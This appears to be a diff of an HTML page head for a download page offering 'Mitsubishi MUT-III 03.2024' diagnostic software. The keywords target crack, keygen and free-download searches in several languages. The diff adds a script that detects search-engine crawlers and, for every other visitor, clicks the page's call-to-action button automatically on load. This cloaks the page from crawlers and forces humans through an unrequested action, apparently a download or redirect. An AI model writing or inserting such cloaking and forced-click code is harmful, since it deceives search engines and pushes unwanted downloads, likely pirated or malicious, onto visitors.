@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mitsubishi MUT-III 03.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Mitsubishi MUT-III Diagnostic Software (03.2024) with advanced features. Available in multiple languages for comprehensive vehicle diagnostics.">
     <meta name="keywords" content="Mitsubishi MUT-III software, MUT-III diagnostic tool, Mitsubishi car diagnostics, MUT-III 03.2024 update, Mitsubishi vehicle diagnostic software, Asia Europe Mitsubishi diagnostics, Mitsubishi technician software, MUT-III online courses, free car diagnostics courses, Mitsubishi brand experience software, heavy truck diagnostic software, Jeep PCM programming software, Dodge diagnostic software, Mitsubishi mechanic tool, automotive diagnostic learning platform, Mitsubishi MUT-III diagnostic software, Mitsubishi MUT-III diagnostic software download, Mitsubishi MUT-III diagnostic software download free, Mitsubishi MUT-III diagnostic software crack, Mitsubishi MUT-III diagnostic software keygen, Mitsubishi MUT-III 03.2024 free download, Mitsubishi MUT-III Диагностическое ПО, Mitsubishi MUT-III Диагностическое ПО бесплатно скачать, Mitsubishi MUT-III диагностические курсы онлайн бесплатно, Mitsubishi MUT-III диагностическое ПО crack, Mitsubishi MUT-III диагностика автомобилей, Mitsubishi MUT-III платформу для обучения, Mitsubishi MUT-III Диагностичний софтер, Mitsubishi MUT-III меню для діагностики, Mitsubishi MUT-III безкоштовне завантаження, Mitsubishi MUT-III програмне забезпечення для діагностики автомобілів">
     <style>
